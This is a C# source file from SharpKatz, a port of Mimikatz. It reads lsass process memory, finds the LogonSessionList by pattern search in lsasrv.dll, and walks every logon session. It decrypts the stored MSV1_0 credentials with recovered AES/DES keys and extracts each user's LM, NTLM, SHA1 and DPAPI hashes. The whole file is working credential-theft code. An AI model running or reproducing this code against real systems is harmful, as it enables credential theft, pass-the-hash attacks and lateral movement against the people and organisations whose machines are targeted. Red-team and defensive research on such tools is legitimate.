﻿using SharpKatz.Credential;
using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;

namespace SharpKatz.Module
{
    class Msv1
    {

        static long max_search_size = 580000;

        static string[] KUHL_M_SEKURLSA_LOGON_TYPE = {
            "UndefinedLogonType",
            "Unknown !",
            "Interactive",
            "Network",
            "Batch",
            "Service",
            "Proxy",
            "Unlock",
            "NetworkCleartext",
            "NewCredentials",
            "RemoteInteractive",
            "CachedInteractive",
            "CachedRemoteInteractive",
            "CachedUnlock"
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MSV1_0_PRIMARY_CREDENTIALS
        {
            public IntPtr next; //KIWI_MSV1_0_PRIMARY_CREDENTIALS
            public Natives.UNICODE_STRING Primary; //ANSI_STRING
            public Natives.UNICODE_STRING Credentials;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MSV1_0_CREDENTIALS
        {
            public IntPtr next; //KIWI_MSV1_0_CREDENTIALS
            public uint AuthenticationPackageId; //DWORD
            public IntPtr PrimaryCredentials; //KIWI_MSV1_0_PRIMARY_CREDENTIALS
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct KIWI_MSV1_0_LIST_63
        {
            public IntPtr Flink;   //KIWI_MSV1_0_LIST_63 off_2C5718
            public IntPtr Blink; //KIWI_MSV1_0_LIST_63 off_277380
            public IntPtr unk0; // unk_2C0AC8
            public int unk1; // 0FFFFFFFFh
            public IntPtr unk2; // 0
            public int unk3; // 0
            public int unk4; // 0
            public int unk5; // 0A0007D0h
            public IntPtr hSemaphore6; // 0F9Ch
            public IntPtr unk7; // 0
            public IntPtr hSemaphore8; // 0FB8h
            public IntPtr unk9; // 0
            public IntPtr unk10; // 0
            public int unk11; // 0
            public int unk12; // 0 
            public IntPtr unk13; // unk_2C0A28
            public Natives.LUID LocallyUniqueIdentifier;
            public Natives.LUID SecondaryLocallyUniqueIdentifier;
            public fixed byte waza[12]; /// to do (maybe align)
            public Natives.UNICODE_STRING UserName;
            public Natives.UNICODE_STRING Domaine;
            public IntPtr unk14;
            public IntPtr unk15;
            public Natives.UNICODE_STRING Type;
            public IntPtr pSid; //PSID
            public int LogonType;
            public IntPtr unk18;
            public int Session;
            public Natives.LARGE_INTEGER LogonTime; // autoalign x86
            public Natives.UNICODE_STRING LogonServer;
            public IntPtr Credentials; //PKIWI_MSV1_0_CREDENTIALS
            public IntPtr unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public int unk22;
            public int unk23;
            public int unk24;
            public int unk25;
            public int unk26;
            public IntPtr unk27;
            public IntPtr unk28;
            public IntPtr unk29;
            public IntPtr CredentialManager;
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct KIWI_MSV1_0_LIST_62
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public IntPtr unk0;
            public int unk1;
            public IntPtr unk2;
            public int unk3;
            public int unk4;
            public int unk5;
            public IntPtr hSemaphore6;
            public IntPtr unk7;
            public IntPtr hSemaphore8;
            public IntPtr unk9;
            public IntPtr unk10;
            public int unk11;
            public int unk12;
            public IntPtr unk13;
            Natives.LUID LocallyUniqueIdentifier;
            Natives.LUID SecondaryLocallyUniqueIdentifier;
            Natives.UNICODE_STRING UserName;
            Natives.UNICODE_STRING Domaine;
            public IntPtr unk14;
            public IntPtr unk15;
            Natives.UNICODE_STRING Type;
            public IntPtr pSid;
            public int LogonType;
            public IntPtr unk18;
            public int Session;
            Natives.LARGE_INTEGER LogonTime; // autoalign x86
            Natives.UNICODE_STRING LogonServer;
            public IntPtr Credentials;
            public IntPtr unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public int unk22;
            public int unk23;
            public int unk24;
            public int unk25;
            public int unk26;
            public IntPtr unk27;
            public IntPtr unk28;
            public IntPtr unk29;
            public IntPtr CredentialManager;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_BASIC_SECURITY_LOGON_SESSION_DATA
        {
            //PKUHL_M_SEKURLSA_CONTEXT	cLsass;
            //const KUHL_M_SEKURLSA_LOCAL_HELPER * lsassLocalHelper;
            public IntPtr LogonId; //PLUID
            public string UserName; //PNatives.UNICODE_STRING
            public string LogonDomain; //PNatives.UNICODE_STRING
            public int LogonType;
            public int Session;
            public IntPtr pCredentials;
            public IntPtr pSid; //PSID
            public IntPtr pCredentialManager;
            public FILETIME LogonTime;
            public string LogonServer; //PNatives.UNICODE_STRING
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_GENERIC_PRIMARY_CREDENTIAL
        {
            public Natives.UNICODE_STRING Domaine;
            public Natives.UNICODE_STRING UserName;
            
            public Natives.UNICODE_STRING Password;
        }

        const int LM_NTLM_HASH_LENGTH = 16;
        const int SHA_DIGEST_LENGTH = 20;

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct MSV1_0_PRIMARY_CREDENTIAL
        {
            Natives.UNICODE_STRING LogonDomainName;
            Natives.UNICODE_STRING UserName;
            fixed byte NtOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte LmOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte ShaOwPassword[SHA_DIGEST_LENGTH];
            byte isNtOwfPassword;
            byte isLmOwfPassword;
            byte isShaOwPassword;
            /* buffer */
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct MSV1_0_PRIMARY_CREDENTIAL_10_OLD
        {
            Natives.UNICODE_STRING LogonDomainName;
            Natives.UNICODE_STRING UserName;
            byte isIso;
            byte isNtOwfPassword;
            byte isLmOwfPassword;
            byte isShaOwPassword;
            byte align0;
            byte align1;
            fixed byte NtOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte LmOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte ShaOwPassword[SHA_DIGEST_LENGTH];
            /* buffer */
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct MSV1_0_PRIMARY_CREDENTIAL_10
        {
            Natives.UNICODE_STRING LogonDomainName;
            Natives.UNICODE_STRING UserName;
            byte isIso;
            byte isNtOwfPassword;
            byte isLmOwfPassword;
            byte isShaOwPassword;
            byte align0;
            byte align1;
            byte align2;
            byte align3;
            fixed byte NtOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte LmOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte ShaOwPassword[SHA_DIGEST_LENGTH];
            /* buffer */
        }

        [StructLayout(LayoutKind.Sequential)]
        public unsafe struct MSV1_0_PRIMARY_CREDENTIAL_10_1607
        {
            Natives.UNICODE_STRING LogonDomainName;
            Natives.UNICODE_STRING UserName;
            IntPtr pNtlmCredIsoInProc;
            byte isIso;
            byte isNtOwfPassword;
            byte isLmOwfPassword;
            byte isShaOwPassword;
            byte isDPAPIProtected;
            byte align0;
            byte align1;
            byte align2;
            uint unkD; // 1/2 DWORD
                       //#pragma pack(push, 2)
            ushort isoSize;  // 0000 WORD
            fixed byte DPAPIProtected[LM_NTLM_HASH_LENGTH];
            uint align3; // 00000000 DWORD
                         //#pragma pack(pop) 
            fixed byte NtOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte LmOwfPassword[LM_NTLM_HASH_LENGTH];
            fixed byte ShaOwPassword[SHA_DIGEST_LENGTH];
            /* buffer */
        }

        public static unsafe int FindCredentials<T>(IntPtr hLsass, IntPtr lsasrvMem, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {

            uint logonSessionListSignOffset, logonSessionListOffset, logonSessionListCountOffset;
            IntPtr logonSessionListAddr;
            int logonSessionListCount; //*DWORD

            // Load lsasrv.dll locally to avoid multiple ReadProcessMemory calls into lsass
            IntPtr lsasrvLocal = Natives.LoadLibrary("lsasrv.dll");
            if (lsasrvLocal == IntPtr.Zero)
            {
                Console.WriteLine("[x] Error: Could not load lsasrv.dll locally");
                return 1;
            }
            Console.WriteLine("[*] Loaded lsasrv.dll locally at address {0:X}", lsasrvLocal.ToInt64());

            byte[] tmpbytes = new byte[max_search_size];
            Marshal.Copy(lsasrvLocal, tmpbytes, 0, (int)max_search_size);

            // Search for LogonSessionList signature within lsasrv.dll and grab the offset
            logonSessionListSignOffset = (uint)Utility.SearchPattern(tmpbytes, oshelper.logonSessionListSign);
            if (logonSessionListSignOffset == 0)
            {
                Console.WriteLine("[x] Error: Could not find LogonSessionList signature\n");
                return 1;
            }
            Console.WriteLine("[*] LogonSessionList offset found as {0}", logonSessionListSignOffset);

            // Read memory offset to LogonSessionList from a "lea param-1, [LogonSessionList]" asm
            IntPtr tmp_p = IntPtr.Add(lsasrvMem, (int)logonSessionListSignOffset + oshelper.LOGONSESSIONLISTOFFSET);
            byte[] logonSessionListOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, sizeof(uint));
            logonSessionListOffset = BitConverter.ToUInt32(logonSessionListOffsetBytes, 0);

            // Read memory offset to LogonSessionListCount from a "mov R8D,dword ptr [LogonSessionListCount]" asm
            tmp_p = IntPtr.Add(lsasrvMem, (int)logonSessionListSignOffset + oshelper.LOGONSESSIONSLISTCOUNTOFFSET);
            byte[] logonSessionListCountOffsetBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, sizeof(uint));
            logonSessionListCountOffset = BitConverter.ToUInt32(logonSessionListCountOffsetBytes, 0);

            // Read pointer at address to get the true memory location of LogonSessionList
            tmp_p = IntPtr.Add(lsasrvMem, (int)logonSessionListSignOffset + oshelper.LOGONSESSIONLISTOFFSET + sizeof(int) + (int)logonSessionListOffset);
            byte[] logonSessionListAddrBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
            logonSessionListAddr = new IntPtr(BitConverter.ToInt64(logonSessionListAddrBytes, 0));
            Int64 logonSessionListAddrInt = BitConverter.ToInt64(logonSessionListAddrBytes, 0);

            // Read pointer at address to get the true memory location of LogonSessionListCount
            tmp_p = IntPtr.Add(lsasrvMem, (int)logonSessionListSignOffset + (int)logonSessionListCountOffset);
            byte[] logonSessionListCountBytes = Utility.ReadFromLsass(ref hLsass, tmp_p, 8);
            logonSessionListCount = BitConverter.ToInt32(logonSessionListCountBytes, 0);

            Console.WriteLine("[*] LogSessList found at address {0:X}", logonSessionListAddr.ToInt64());
            Console.WriteLine("[*] LogSessListCount {0}", logonSessionListCount);

            Type ListType = oshelper.ListType;
            Type ex = typeof(Utility);
            MethodInfo mi = ex.GetMethod("Deserialize");
            MethodInfo miConstructed = mi.MakeGenericMethod(ListType);

            IntPtr pList = logonSessionListAddr;

            do
            {
                byte[] listentryBytes = Utility.ReadFromLsass(ref hLsass, pList, Convert.ToUInt64(oshelper.ListTypeSize));

                object[] args = { listentryBytes };
                var slistentry = miConstructed.Invoke(null, args);

                IntPtr listentry = Marshal.AllocHGlobal(Marshal.SizeOf(slistentry));
                Marshal.StructureToPtr(slistentry, listentry, false);

                KIWI_BASIC_SECURITY_LOGON_SESSION_DATA logonsession = new KIWI_BASIC_SECURITY_LOGON_SESSION_DATA
                {
                    LogonId = IntPtr.Add(listentry, oshelper.LocallyUniqueIdentifierOffset),
                    LogonType = Marshal.ReadInt32(IntPtr.Add(listentry, oshelper.LogonTypeOffset)),//slistentry.LogonType,
                    Session = Marshal.ReadInt32(IntPtr.Add(listentry, oshelper.SessionOffset)),//slistentry.Session
                    pCredentials = new IntPtr(Marshal.ReadInt64(IntPtr.Add(listentry, oshelper.CredentialsOffset))),//slistentry.Credentials,
                    pCredentialManager = new IntPtr(Marshal.ReadInt64(IntPtr.Add(listentry, oshelper.CredentialManagerOffset))),
                    pSid = IntPtr.Add(listentry, oshelper.pSidOffset)
                };
                FILETIME logontime = (FILETIME)Marshal.PtrToStructure(IntPtr.Add(listentry, oshelper.LogonTimeOffset), typeof(FILETIME));
                logonsession.LogonTime = logontime;

                IntPtr lsasscred = logonsession.pCredentials;

                if (lsasscred != IntPtr.Zero)
                {
                    IntPtr pUserName = IntPtr.Add(pList, oshelper.UserNameListOffset);
                    IntPtr pLogonDomain = IntPtr.Add(pList, oshelper.DomaineOffset);
                    IntPtr pLogonServer = IntPtr.Add(pList, oshelper.LogonServerOffset);

                    logonsession.UserName = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pUserName));
                    logonsession.LogonDomain = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pLogonDomain));
                    logonsession.LogonServer = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pLogonServer));

                    Natives.LUID luid = (Natives.LUID)Marshal.PtrToStructure(logonsession.LogonId, typeof(Natives.LUID));

                    Msv msventry = new Msv();


                    /*Console.WriteLine("[*] Authentication Id : {0} ; {1} ({2:X}:{3:X})", luid.HighPart, luid.LowPart, luid.HighPart, luid.LowPart);
                    Console.WriteLine("[*] Session {0} from {1}", KUHL_M_SEKURLSA_LOGON_TYPE[logonsession.LogonType], logonsession.Session);
                    Console.WriteLine("[*] UserName {0}", logonsession.UserName);
                    Console.WriteLine("[*] LogonDomain {0}", logonsession.LogonDomain);
                    Console.WriteLine("[*] LogonServer {0}", logonsession.LogonServer);*/

                    string stringSid;
                    Natives.ConvertSidToStringSid(Utility.ExtractSid(hLsass, logonsession.pSid), out stringSid);
                    

                    KIWI_MSV1_0_CREDENTIALS credentials;
                    KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;

                    while (lsasscred != IntPtr.Zero)
                    {
                        byte[] credentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(sizeof(KIWI_MSV1_0_CREDENTIALS)));
                        credentials = Utility.Deserialize<KIWI_MSV1_0_CREDENTIALS>(credentialsBytes);

                        lsasscred = credentials.PrimaryCredentials;
                        while (lsasscred != IntPtr.Zero)
                        {
                            byte[] primaryCredentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Convert.ToUInt64(sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)));
                            primaryCredentials = Utility.Deserialize<KIWI_MSV1_0_PRIMARY_CREDENTIALS>(primaryCredentialsBytes);
                            primaryCredentials.Credentials = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1CredentialsOffset));
                            primaryCredentials.Primary = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1PrimaryOffset));

                            if (Utility.ExtractANSIStringString(hLsass, primaryCredentials.Primary).Equals("Primary"))
                            {

                                byte[] msvCredentialsBytes = Utility.ReadFromLsass(ref hLsass, primaryCredentials.Credentials.Buffer, (ulong)primaryCredentials.Credentials.MaximumLength);

                                byte[] msvDecryptedCredentialsBytes = BCrypt.DecryptCredentials(msvCredentialsBytes, iv, aeskey, deskey);

                                IntPtr msvCredentials = Marshal.AllocHGlobal(msvDecryptedCredentialsBytes.Length);
                                Marshal.Copy(msvDecryptedCredentialsBytes, 0, msvCredentials, msvDecryptedCredentialsBytes.Length);

                                Natives.UNICODE_STRING usLogonDomainName = (Natives.UNICODE_STRING)Marshal.PtrToStructure(IntPtr.Add(msvCredentials, oshelper.LogonDomainNameOffset), typeof(Natives.UNICODE_STRING));
                                Natives.UNICODE_STRING usUserName = (Natives.UNICODE_STRING)Marshal.PtrToStructure(IntPtr.Add(msvCredentials, oshelper.UserNameOffset), typeof(Natives.UNICODE_STRING));

                                msventry = new Msv();
                                msventry.DomainName = Marshal.PtrToStringUni(IntPtr.Add(msvCredentials, usLogonDomainName.Buffer.ToInt32()));
                                msventry.UserName = Marshal.PtrToStringUni(IntPtr.Add(msvCredentials, usUserName.Buffer.ToInt32()));
                                msventry.Lm = Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.LmOwfPasswordOffset), LM_NTLM_HASH_LENGTH);
                                msventry.Ntlm = Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.NtOwfPasswordOffset), LM_NTLM_HASH_LENGTH);
                                msventry.Sha1 = Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.ShaOwPasswordOffset), SHA_DIGEST_LENGTH);
                                msventry.Dpapi = Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.DPAPIProtectedOffset), LM_NTLM_HASH_LENGTH);
                                /*Console.WriteLine("[*]\t Username : {0} ", Marshal.PtrToStringUni(IntPtr.Add(msvCredentials, usUserName.Buffer.ToInt32())));
                                Console.WriteLine("[*]\t Domain   : {0} ", Marshal.PtrToStringUni(IntPtr.Add(msvCredentials, usLogonDomainName.Buffer.ToInt32())));
                                Console.Write("[*]\t LM       : ");
                                Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.LmOwfPasswordOffset), LM_NTLM_HASH_LENGTH);
                                Console.Write("[*]\t NTLM     : ");
                                Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.NtOwfPasswordOffset), LM_NTLM_HASH_LENGTH);
                                Console.Write("[*]\t SHA1     : ");
                                Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.ShaOwPasswordOffset), SHA_DIGEST_LENGTH);
                                Console.Write("[*]\t DPAPI    : ");
                                Utility.PrintHash(IntPtr.Add(msvCredentials, oshelper.DPAPIProtectedOffset), LM_NTLM_HASH_LENGTH);
                                Console.WriteLine("\n");*/

                                Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                                if (currentlogon == null)
                                {
                                    currentlogon = new Logon(luid)
                                    {
                                        Session = logonsession.Session,
                                        LogonType = KUHL_M_SEKURLSA_LOGON_TYPE[logonsession.LogonType],
                                        LogonTime = logonsession.LogonTime,
                                        UserName = logonsession.UserName,
                                        LogonDomain = logonsession.LogonDomain,
                                        LogonServer = logonsession.LogonServer,

                                        Msv = msventry
                                    };
                                    logonlist.Add(currentlogon);
                                }
                                else
                                {
                                    currentlogon.Msv = msventry;
                                }

                            }
                            lsasscred = primaryCredentials.next;
                        }
                        lsasscred = credentials.next;
                    }
                }

                pList = new IntPtr(Marshal.ReadInt64(listentry));
            } while (pList != logonSessionListAddr);

            return 0;
        }
    }
}
